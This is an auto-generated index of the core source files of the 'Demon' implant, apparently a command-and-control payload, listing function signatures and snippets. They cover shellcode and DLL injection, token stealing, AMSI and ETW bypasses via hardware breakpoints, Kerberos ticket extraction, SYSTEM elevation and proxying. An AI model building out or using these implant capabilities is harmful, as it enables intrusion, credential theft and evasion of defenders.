# Subsystem: core

## payloads/Demon/src/core/CoffeeLdr.c
- Layer: utility
- Doc: include <Demon.h> include <common/Macros.h> include <core/Win32.h> include <core/MiniStd.h> include <core/Package.h> inc
- Language: c
- Symbols:
  - `VehDebugger` (function, line 31) `LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )`
  - `SymbolIncludesLibrary` (function, line 64) `BOOL SymbolIncludesLibrary( LPSTR Symbol )`
  - `SymbolIsImport` (function, line 80) `BOOL SymbolIsImport( LPSTR Symbol )`
  - `CoffeeProcessSymbol` (function, line 86) `BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, PVOID* pFuncAddr )`
  - `CoffeeFunction` (function, line 242) `VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )`
  - `PUTS` (function, line 250) `PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument,...`
  - `CoffeeCleanup` (function, line 393) `VOID CoffeeCleanup( PCOFFEE Coffee )`
  - `CoffeeProcessSections` (function, line 423) `BOOL CoffeeProcessSections( PCOFFEE Coffee )`
  - `CoffeeGetFunMapSize` (function, line 602) `SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )`
  - `RemoveCoffeeFromInstance` (function, line 641) `VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )`
  - `PUTS` (function, line 668) `PUTS( "Coffe entry was not found" )
}

VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID A...`
  - `PRINTF` (function, line 677) `PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData,...`
  - `CoffeeRunnerThread` (function, line 798) `VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )`
  - `CoffeeRunner` (function, line 820) `VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize,...`
  - `PackageAddInt32` (function, line 54) `PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION );`
  - `PackageAddInt64` (function, line 57) `PackageAddInt64( Package, (UINT64)(ULONG_PTR)Exception->ExceptionRecord->ExceptionAddress );`
  - `PackageTransmit` (function, line 58) `PackageTransmit( Package );`
  - `MemCopy` (function, line 99) `MemCopy( Bak, SymbolName, StringLengthA( SymbolName ) + 1 );`
  - `StringCopyA` (function, line 126) `StringCopyA( SymName, SymFunction );`
  - `PackageAddString` (function, line 235) `PackageAddString( Package, SymbolName );`
  - `Function` (function, line 249) `Function( Argument, Size );`
  - `NtSetLastError` (function, line 410) `NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );`
  - `MemSet` (function, line 416) `MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );`
  - `CoffeeLdr` (function, line 803) `CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID );`
  - `DATA_FREE` (function, line 809) `DATA_FREE( Param->EntryName, Param->EntryNameSize );`
  - `JobRemove` (function, line 814) `JobRemove( (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread );`
  - `COFF_PREP_SYMBOL` (macro, line 12) `#define COFF_PREP_SYMBOL`
  - `COFF_PREP_SYMBOL_SIZE` (macro, line 13) `#define COFF_PREP_SYMBOL_SIZE`
  - `COFF_PREP_BEACON` (macro, line 15) `#define COFF_PREP_BEACON`
  - `COFF_PREP_BEACON_SIZE` (macro, line 16) `#define COFF_PREP_BEACON_SIZE`
  - `COFF_INSTANCE` (macro, line 18) `#define COFF_INSTANCE`
  - `COFF_PREP_SYMBOL` (macro, line 21) `#define COFF_PREP_SYMBOL`
  - `COFF_PREP_SYMBOL_SIZE` (macro, line 22) `#define COFF_PREP_SYMBOL_SIZE`
  - `COFF_PREP_BEACON` (macro, line 24) `#define COFF_PREP_BEACON`
  - `COFF_PREP_BEACON_SIZE` (macro, line 25) `#define COFF_PREP_BEACON_SIZE`
  - `COFF_INSTANCE` (macro, line 27) `#define COFF_INSTANCE`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/CoffeeLdr.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/ObjectApi.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Win32.h`, `payloads/Demon/include/inject/InjectUtil.h`

## payloads/Demon/src/core/Command.c
- Layer: utility
- Doc: include <Demon.h>  include <common/Macros.h>  include <core/Command.h> include <core/Token.h> include <core/Package.h> i
- Language: c
- Symbols:
  - `CommandDispatcher` (function, line 48) `VOID CommandDispatcher( VOID )`
  - `PRINTF` (function, line 107) `PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, Requ...`
  - `PUTS` (function, line 159) `PUTS( "Out of while loop" )
}

VOID CommandCheckin( PPARSER Parser )`
  - `CommandSleep` (function, line 173) `VOID CommandSleep( PPARSER Parser )`
  - `CommandJob` (function, line 187) `VOID CommandJob( PPARSER Parser )`
  - `CommandProc` (function, line 262) `VOID CommandProc( PPARSER Parser )`
  - `PUTS` (function, line 272) `case DEMON_COMMAND_PROC_MODULES: PUTS( "Proc::Modules" )`
  - `PUTS` (function, line 336) `case DEMON_COMMAND_PROC_GREP: PUTS("Proc::Grep")`
  - `PUTS` (function, line 422) `case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )`
  - `PUTS` (function, line 467) `case DEMON_COMMAND_PROC_MEMORY: PUTS( "Proc::Memory" )`
  - `PUTS` (function, line 527) `case DEMON_COMMAND_PROC_KILL: PUTS( "Proc::Kill" )`
  - `CommandProcList` (function, line 562) `VOID CommandProcList(
    IN PPARSER Parser
)`
  - `PACKAGE_ERROR_NTSTATUS` (function, line 671) `PACKAGE_ERROR_NTSTATUS( NtStatus )
    }
}

VOID CommandFS( PPARSER Parser )`
  - `PUTS` (function, line 684) `case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )`
  - `PUTS` (function, line 793) `case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )`
  - `PRINTF` (function, line 824) `PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )

            if ( ! Instance->Win32.Ge...`
  - `PUTS` (function, line 865) `CleanupDownload:
            PUTS( "CleanupDownload" )

            if ( FileName.Buffer )`
  - `PUTS` (function, line 881) `case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )`
  - `PUTS` (function, line 948) `case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )`
  - `PUTS` (function, line 963) `case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )`
  - `PUTS` (function, line 993) `case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )`
  - `PUTS` (function, line 1009) `case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )`
  - `PUTS` (function, line 1034) `case DEMON_COMMAND_FS_MOVE: PUTS( "FS::Move" )`
  - `PUTS` (function, line 1059) `case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )`
  - `PUTS` (function, line 1074) `case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )`
  - `CommandInlineExecute` (function, line 1113) `VOID CommandInlineExecute( PPARSER Parser )`
  - `PUTS` (function, line 1181) `PUTS( "Use default (from config) CoffeeLdr" )

            if ( Instance->Config.Implant.CoffeeTh...`
  - `CommandInjectDLL` (function, line 1202) `VOID CommandInjectDLL( PPARSER Parser )`
  - `CommandSpawnDLL` (function, line 1246) `VOID CommandSpawnDLL( PPARSER Parser )`
  - `CommandInjectShellcode` (function, line 1265) `VOID CommandInjectShellcode(
    IN PPARSER Parser
)`
  - `PRINTF` (function, line 1292) `PRINTF(
        "Injection Args:      \n"
        " - Way     : %d      \n"
        " - Method  :...`
  - `PUTS` (function, line 1312) `case INJECT_WAY_SPAWN: PUTS( "INJECT_WAY_SPAWN" )`
  - `PRINTF` (function, line 1319) `PRINTF( "Target spawn process: %ls\n", Spawn )

            /* create process */
            if (...`
  - `PUTS` (function, line 1352) `case INJECT_WAY_INJECT: PUTS( "INJECT_WAY_INJECT" )`
  - `PUTS` (function, line 1357) `case INJECT_WAY_EXECUTE: PUTS( "INJECT_WAY_EXECUTE" )`
  - `CommandToken` (function, line 1372) `VOID CommandToken( PPARSER Parser )`
  - `PUTS` (function, line 1383) `case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )`
  - `PUTS` (function, line 1405) `case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )`
  - `PUTS` (function, line 1449) `case DEMON_COMMAND_TOKEN_LIST: PUTS( "Token::List" )`
  - `PUTS` (function, line 1476) `case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )`
  - `PUTS` (function, line 1531) `case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )`
  - `PUTS` (function, line 1594) `case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )`
  - `PUTS` (function, line 1634) `case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )`
  - `PUTS` (function, line 1649) `case DEMON_COMMAND_TOKEN_REMOVE: PUTS( "Token::Remove" )`
  - `PUTS` (function, line 1659) `case DEMON_COMMAND_TOKEN_CLEAR: PUTS( "Token::Clear" )`
  - `PUTS` (function, line 1667) `case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::Find" )`
  - `CommandAssemblyInlineExecute` (function, line 1707) `VOID CommandAssemblyInlineExecute( PPARSER Parser )`
  - `PRINTF` (function, line 1760) `PRINTF(
            "Parsed Arguments:         \n"
            " - PipeName     [%d]: %ls \n"
   ...`
  - `PUTS` (function, line 1788) `PUTS( "Dotnet instance already running." )
    }
}

VOID CommandAssemblyListVersion( PPARSER Pars...`
  - `PUTS` (function, line 1840) `else
        PUTS("Failed to load mscoree.dll")


    if ( pClrMetaHost )`
  - `CommandConfig` (function, line 1864) `VOID CommandConfig( PPARSER Parser )`
  - `CommandScreenshot` (function, line 2083) `VOID CommandScreenshot( PPARSER Parser )`
  - `CommandNet` (function, line 2109) `VOID CommandNet( PPARSER Parser )`
  - `PUTS` (function, line 2350) `PUTS( "NetLocalGroupEnum => Success" )
                if ( GroupInfo )`
  - `CommandPivot` (function, line 2462) `VOID CommandPivot( PPARSER Parser )`
  - `CommandTransfer` (function, line 2607) `VOID CommandTransfer( PPARSER Parser )`
  - `PUTS` (function, line 2624) `case DEMON_COMMAND_TRANSFER_LIST: PUTS( "Transfer::list" )`
  - `PUTS` (function, line 2640) `case DEMON_COMMAND_TRANSFER_STOP: PUTS( "Transfer::stop" )`
  - `PUTS` (function, line 2667) `case DEMON_COMMAND_TRANSFER_RESUME: PUTS( "Transfer::resume" )`
  - `PUTS` (function, line 2695) `case DEMON_COMMAND_TRANSFER_REMOVE: PUTS( "Transfer::remove" )`
  - `CommandSocket` (function, line 2738) `VOID CommandSocket( PPARSER Parser )`
  - `PUTS` (function, line 2751) `case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )`
  - `PUTS` (function, line 2785) `case SOCKET_COMMAND_RPORTFWD_LIST: PUTS( "Socket::RPortFwdList" )`
  - `PUTS` (function, line 2818) `case SOCKET_COMMAND_RPORTFWD_REMOVE: PUTS( "Socket::RPortFwdRemove" )`
  - `PUTS` (function, line 2849) `case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )`
  - `PUTS` (function, line 2870) `case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )`
  - `PUTS` (function, line 2877) `case SOCKET_COMMAND_WRITE: PUTS( "Socket::Write" )`
  - `PUTS` (function, line 2941) `case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )`
  - `PRINTF` (function, line 2996) `PRINTF( "Socket ID: %x\n", ScId )

            /* check if address is not 0 */
            if ( I...`
  - `PUTS` (function, line 3035) `case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )`
  - `CommandKerberos` (function, line 3076) `VOID CommandKerberos(
    IN PPARSER Parser
)`
  - `PUTS` (function, line 3090) `case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")`
  - `PUTS` (function, line 3116) `case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")`
  - `PUTS` (function, line 3204) `case KERBEROS_COMMAND_PURGE: PUTS("Kerberos::Purge")`
  - `PUTS` (function, line 3215) `case KERBEROS_COMMAND_PTT: PUTS("Kerberos::Ptt")`
  - `CommandMemFile` (function, line 3236) `VOID CommandMemFile( PPARSER Parser )`
  - `InWorkingHours` (function, line 3262) `BOOL InWorkingHours( )`
  - `ReachedKillDate` (function, line 3294) `BOOL ReachedKillDate()`
  - `KillDate` (function, line 3299) `VOID KillDate( )`
  - `CommandExit` (function, line 3315) `VOID CommandExit( PPARSER Parser )`
  - `SleepObf` (function, line 65) `SleepObf();`
  - `PackageTransmitAll` (function, line 87) `PackageTransmitAll( NULL, NULL );`
  - `ParserNew` (function, line 98) `ParserNew( &Parser, DataBuffer, DataBufferSize );`
  - `ParserDecrypt` (function, line 110) `ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );`
  - `MemSet` (function, line 125) `MemSet( DataBuffer, 0, DataBufferSize );`
  - `ParserDestroy` (function, line 129) `ParserDestroy( &Parser );`
  - `JobCheckList` (function, line 142) `JobCheckList();`
  - `PivotPush` (function, line 145) `PivotPush();`
  - `DownloadPush` (function, line 148) `DownloadPush();`
  - `DotnetPush` (function, line 151) `DotnetPush();`
  - `SocketPush` (function, line 154) `SocketPush();`
  - `DemonMetaData` (function, line 168) `DemonMetaData( &Package, FALSE );`
  - `PackageTransmit` (function, line 170) `PackageTransmit( Package );`
  - `PackageAddInt32` (function, line 182) `PackageAddInt32( Package, Instance->Config.Sleeping );`
  - `SysNtReadVirtualMemory` (function, line 311) `SysNtReadVirtualMemory( hProcess, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &Size );`
  - `PackageAddString` (function, line 315) `PackageAddString( Package, ModuleName );`
  - `PackageAddPtr` (function, line 317) `PackageAddPtr( Package, CurrentModule.DllBase );`
  - `SysNtClose` (function, line 331) `SysNtClose( hProcess );`
  - `PackageAddWString` (function, line 376) `PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );`
  - `PackageAddBytes` (function, line 380) `PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );`
  - `MemZero` (function, line 394) `MemZero( UserDomain.Buffer, UserDomain.Length );`
  - `MmHeapFree` (function, line 395) `MmHeapFree( UserDomain.Buffer );`
  - `NtSetLastError` (function, line 416) `NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );`
  - `U_PTR` (function, line 594) `U_PTR( SysProcessInfo->UniqueProcessId ), Instance->Session.OSVersion > WIN_VERSION_XP ? PROCESS_QUERY_LIMITED_INFORMATION : PROCESS_QUERY_INFORMATION );`
  - `DATA_FREE` (function, line 723) `DATA_FREE( Path, MAX_PATH * sizeof( WCHAR ) );`
  - `MemCopy` (function, line 735) `MemCopy( Path, TargetFolder, MAX_PATH * sizeof( WCHAR ) );`
  - `PackageAddBool` (function, line 747) `PackageAddBool( Package, FileExplorer );`
  - `PackageAddInt64` (function, line 761) `PackageAddInt64( Package, RootDir->TotalFileSize );`
  - `Data` (function, line 843) `* * Data (Open): * [ File Size ] * [ File Name ] * * Data (Write) * [ Chunk Data ] Size + FileChunk * * Data (Close): * [ Reason ] Removed or Finished * */ /* Download Header */ PackageAddInt32( Packa`
  - `PackageTransmitError` (function, line 955) `PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );`
  - `PackageDestroy` (function, line 1109) `CLEAR_LEAVE: PackageDestroy( Package );`
  - `RemoveMemFile` (function, line 1197) `CLEANUP: RemoveMemFile( BofFileID );`
  - `ProcessTerminate` (function, line 1331) `ProcessTerminate( PcInfo.hProcess, 0 );`
  - `RtlSecureZeroMemory` (function, line 1345) `RtlSecureZeroMemory( &PcInfo, sizeof( PROC_INFO ) );`
  - `StringConcatW` (function, line 1560) `StringConcatW( UserDomain, lpDomain );`
  - `ImpersonateTokenFromVault` (function, line 1584) `ImpersonateTokenFromVault( NewTokenID );`
  - `TokenClear` (function, line 1662) `TokenClear();`
  - `DotnetClose` (function, line 1780) `DotnetClose();`
  - `JobKill` (function, line 3359) `JobKill( JobID );`
  - `DownloadRemove` (function, line 3391) `DownloadRemove( DownloadEntry->FileID );`
  - `PivotRemove` (function, line 3428) `PivotRemove( SmbPivotEntry->DemonID );`
  - `TokenImpersonate` (function, line 3446) `TokenImpersonate( FALSE );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/CoffeeLdr.h`, `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/Dotnet.h`, `payloads/Demon/include/core/Download.h`, `payloads/Demon/include/core/Kerberos.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/SleepObf.h`, `payloads/Demon/include/core/Token.h`, `payloads/Demon/include/inject/Inject.h`

## payloads/Demon/src/core/Dotnet.c
- Layer: utility
- Doc: include <Demon.h>  include <core/MiniStd.h> include <core/Dotnet.h> include <core/HwBpExceptions.h> include <core/Runtim
- Language: c
- Symbols:
  - `DotnetExecute` (function, line 18) `BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )`
  - `PUTS` (function, line 100) `PUTS( "Init HwBp Engine" )
        /* use global engine */
        if ( ! NT_SUCCESS( HwBpEngineI...`
  - `PUTS` (function, line 112) `PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
            if ( ! NT_SUCCESS( Status = HwBpEngin...`
  - `PUTS` (function, line 120) `PUTS( "HwBp Engine add NtTraceEvent bypass" )
        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, Thr...`
  - `PUTS` (function, line 147) `PUTS( "CreateDomain..." )
    if ( ( Result = Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDo...`
  - `PUTS` (function, line 153) `PUTS( "QueryInterface..." )
    if ( ( Result = Instance->Dotnet->AppDomainThunk->lpVtbl->QueryIn...`
  - `PRINTF` (function, line 169) `PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
        PACKAGE_ERROR_WIN32
    }

    PUTS...`
  - `PUTS` (function, line 178) `PUTS( "Assembly EntryPoint..." )
    if ( ( Result = Instance->Dotnet->Assembly->lpVtbl->EntryPoi...`
  - `PUTS` (function, line 236) `PUTS( "Creating events..." )
    if ( NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotne...`
  - `PUTS` (function, line 285) `PUTS( "Resume Thread..." )
                if ( NT_SUCCESS( Instance->Win32.NtAlertResumeThread( ...`
  - `DotnetPushPipe` (function, line 312) `VOID DotnetPushPipe()`
  - `DotnetPush` (function, line 346) `VOID DotnetPush()`
  - `PRINTF` (function, line 351) `PRINTF( "Instance->Dotnet->Invoked: %s\n", Instance->Dotnet->Invoked ? "TRUE" : "FALSE" )
    if ...`
  - `DotnetClose` (function, line 378) `VOID DotnetClose()`
  - `PUTS` (function, line 427) `PUTS( "Free Output" )
    if ( Instance->Dotnet->Output.Buffer )`
  - `PUTS` (function, line 435) `PUTS( "Unload and free CLR" )
    if ( Instance->Dotnet->MethodArgs )`
  - `FindVersion` (function, line 500) `BOOL FindVersion( PVOID Assembly, DWORD length )`
  - `ClrCreateInstance` (function, line 523) `DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *p...`
  - `PackageAddInt32` (function, line 93) `PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );`
  - `PackageTransmit` (function, line 125) `PackageTransmit( PackageInfo );`
  - `PackageAddBytes` (function, line 140) `PackageAddBytes( PackageInfo, Instance->Dotnet->NetVersion.Buffer, Instance->Dotnet->NetVersion.Length );`
  - `MemSet` (function, line 230) `MemSet( &ClientId, 0, sizeof( CLIENT_ID ) );`
  - `MemCopy` (function, line 251) `MemCopy( Instance->Dotnet->RopInvk, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );`
  - `MmHeapFree` (function, line 340) `MmHeapFree( Instance->Dotnet->Output.Buffer );`
  - `HwBpEngineDestroy` (function, line 386) `HwBpEngineDestroy( NULL );`
  - `SysNtClose` (function, line 390) `SysNtClose( Instance->Dotnet->Event );`
  - `SysNtTerminateThread` (function, line 486) `SysNtTerminateThread( Instance->Dotnet->Thread, 0 );`
  - `PIPE_BUFFER` (macro, line 7) `#define PIPE_BUFFER`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Dotnet.h`, `payloads/Demon/include/core/HwBpExceptions.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Runtime.h`

## payloads/Demon/src/core/Download.c
- Layer: utility
- Doc: include <Demon.h>  include <core/MiniStd.h>  Add file to linked list with type (upload/download)
- Language: c
- Symbols:
  - `DownloadAdd` (function, line 6) `PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )`
  - `DownloadGet` (function, line 27) `PDOWNLOAD_DATA DownloadGet( DWORD FileID )`
  - `DownloadFree` (function, line 41) `VOID DownloadFree( PDOWNLOAD_DATA Download )`
  - `DownloadRemove` (function, line 55) `BOOL DownloadRemove( DWORD FileID )`
  - `DownloadPush` (function, line 94) `VOID DownloadPush()`
  - `PRINTF` (function, line 128) `PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", Instance->DownloadChunk.Bu...`
  - `MemFileIsNew` (function, line 237) `BOOL MemFileIsNew( ULONG32 ID )`
  - `NewMemFile` (function, line 254) `PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )`
  - `GetMemFile` (function, line 286) `PMEM_FILE GetMemFile( ULONG32 ID )`
  - `ProcessMemFileChunk` (function, line 301) `PMEM_FILE ProcessMemFileChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )`
  - `MemFileReadChunk` (function, line 317) `PMEM_FILE MemFileReadChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )`
  - `MemFileFree` (function, line 338) `VOID MemFileFree( PMEM_FILE MemFile )`
  - `RemoveMemFile` (function, line 354) `BOOL RemoveMemFile( ULONG32 ID )`
  - `SysNtClose` (function, line 45) `SysNtClose( Download->hFile );`
  - `PUTS` (function, line 47) `PUTS( "Free download object" ) /* Now free the struct */ MemSet( Download, 0, sizeof( DOWNLOAD_DATA ) );`
  - `MmHeapFree` (function, line 52) `MmHeapFree( Download );`
  - `MemSet` (function, line 108) `MemSet( Instance->DownloadChunk.Buffer, 0, Instance->DownloadChunk.Length );`
  - `PackageAddInt32` (function, line 156) `PackageAddInt32( Package, 2 );`
  - `PackageAddBytes` (function, line 161) `PackageAddBytes( Package, Instance->DownloadChunk.Buffer, Read );`
  - `PackageTransmit` (function, line 182) `PackageTransmit( Package );`
  - `MemCopy` (function, line 270) `MemCopy( MemFile->Data, Data, ReadSize );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/HwBpEngine.c
- Layer: utility
- Doc: include <Demon.h> include <core/HwBpEngine.h> include <core/HwBpExceptions.h> include <core/SysNative.h> include <core/M
- Language: c
- Symbols:
  - `HwBpEngineInit` (function, line 18) `NTSTATUS HwBpEngineInit(
    OUT PHWBP_ENGINE Engine,
    IN  PVOID        Handler
)`
  - `HwBpEngineSetBp` (function, line 61) `NTSTATUS HwBpEngineSetBp(
    IN DWORD Tid,
    IN PVOID Address,
    IN BYTE  Position,
    IN B...`
  - `PRINTF` (function, line 115) `PRINTF(
                "Dr Registers:  \n"
                "- Dr0[%d]: %p  \n"
                "...`
  - `HwBpEngineAdd` (function, line 152) `NTSTATUS HwBpEngineAdd(
    IN PHWBP_ENGINE Engine,
    IN DWORD        Tid,
    IN PVOID        ...`
  - `PRINTF` (function, line 161) `PRINTF( "Engine:[%p] Tid:[%d] Address:[%p] Function:[%p] Position:[%d]\n", Engine, Tid, Address, ...`
  - `HwBpEngineRemove` (function, line 208) `NTSTATUS HwBpEngineRemove(
    IN PHWBP_ENGINE Engine,
    IN DWORD        Tid,
    IN PVOID     ...`
  - `HwBpEngineDestroy` (function, line 260) `NTSTATUS HwBpEngineDestroy(
    IN PHWBP_ENGINE Engine
)`
  - `ExceptionHandler` (function, line 320) `LONG ExceptionHandler(
    _Inout_ PEXCEPTION_POINTERS Exception
)`
  - `PRINTF` (function, line 354) `PRINTF( "Found exception handler: %s\n", Found ? "TRUE" : "FALSE" )
        if ( Found )`
  - `InitializeObjectAttributes` (function, line 75) `InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );`
  - `SysNtClose` (function, line 135) `SysNtClose( Thread );`
  - `PUTS` (function, line 189) `PUTS( "[HWBP] Failed to set hardware breakpoint" );`
  - `MmHeapFree` (function, line 202) `MmHeapFree( BpEntry );`
  - `MemZero` (function, line 246) `MemZero( BpEntry, sizeof( BP_LIST ) );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/HwBpEngine.h`, `payloads/Demon/include/core/HwBpExceptions.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/SysNative.h`

## payloads/Demon/src/core/HwBpExceptions.c
- Layer: utility
- Doc: include <Demon.h> include <core/HwBpExceptions.h>  if _WIN64
- Language: c
- Symbols:
  - `HwBpExAmsiScanBuffer` (function, line 5) `VOID HwBpExAmsiScanBuffer(
    _Inout_ PEXCEPTION_POINTERS Exception
)`
  - `HwBpExNtTraceEvent` (function, line 22) `VOID HwBpExNtTraceEvent(
    _Inout_ PEXCEPTION_POINTERS Exception
)`
  - `EXCEPTION_SET_RET` (function, line 15) `EXCEPTION_SET_RET( Exception, 0x80070057 );`
  - `EXCEPTION_ADJ_STACK` (function, line 19) `EXCEPTION_ADJ_STACK( Exception, sizeof( PVOID ) );`
  - `EXCEPTION_SET_RIP` (function, line 20) `EXCEPTION_SET_RIP( Exception, U_PTR( Return ) );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/HwBpExceptions.h`

## payloads/Demon/src/core/Jobs.c
- Layer: utility
- Doc: include <Demon.h>  include <core/Jobs.h> include <core/Package.h> include <core/MiniStd.h> include <core/ObjectApi.h>  !
- Language: c
- Symbols:
  - `JobAdd` (function, line 17) `VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )`
  - `JobCheckList` (function, line 63) `VOID JobCheckList()`
  - `JobSuspend` (function, line 184) `BOOL JobSuspend( DWORD JobID )`
  - `PRINTF` (function, line 192) `PRINTF( "Found Job ID: %d", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )`
  - `JobResume` (function, line 230) `BOOL JobResume( DWORD JobID )`
  - `PRINTF` (function, line 238) `PRINTF( "Found Job ID: %d", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )`
  - `JobKill` (function, line 277) `BOOL JobKill( DWORD JobID )`
  - `PRINTF` (function, line 287) `PRINTF( "Found Job ID: %d\n", JobID )

            switch ( JobList->Type )`
  - `PUTS` (function, line 300) `PUTS( "Kill using handle" )

                            if ( ! NT_SUCCESS( NtStatus = Instance->...`
  - `JobRemove` (function, line 383) `VOID JobRemove( DWORD JobID )`
  - `AnonPipesRead` (function, line 114) `AnonPipesRead( ( ( PANONPIPE ) JobList->Data ), JobList->RequestID );`
  - `PackageAddInt32` (function, line 118) `PackageAddInt32( Package, DEMON_COMMAND_JOB_DIED );`
  - `PackageTransmit` (function, line 119) `PackageTransmit( Package );`
  - `SysNtClose` (function, line 122) `SysNtClose( JobList->Handle );`
  - `PackageAddBytes` (function, line 160) `PackageAddBytes( Package, Buffer, Available );`
  - `MemSet` (function, line 427) `MemSet( JobToRemove, 0, sizeof( JOB_DATA ) );`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Jobs.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/ObjectApi.h`, `payloads/Demon/include/core/Package.h`

## payloads/Demon/src/core/Kerberos.c
- Layer: utility
- Doc: include <Demon.h> include <core/Kerberos.h> include <core/Win32.h> include <core/MiniStd.h> include <core/Token.h>
- Language: c
- Symbols:
  - `IsHighIntegrity` (function, line 7) `BOOL IsHighIntegrity(HANDLE TokenHandle)`
  - `GetProcessIdByName` (function, line 28) `DWORD GetProcessIdByName(WCHAR* processName)`
  - `ElevateToSystem` (function, line 60) `BOOL ElevateToSystem()`
  - `IsSystem` (function, line 130) `BOOL IsSystem( HANDLE TokenHandle )`
  - `GetLsaHandle` (function, line 154) `NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )`
  - `GetLogonSessionData` (function, line 217) `NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )`
  - `ExtractTicket` (function, line 282) `VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR*...`
  - `CopySessionInfo` (function, line 336) `VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )`
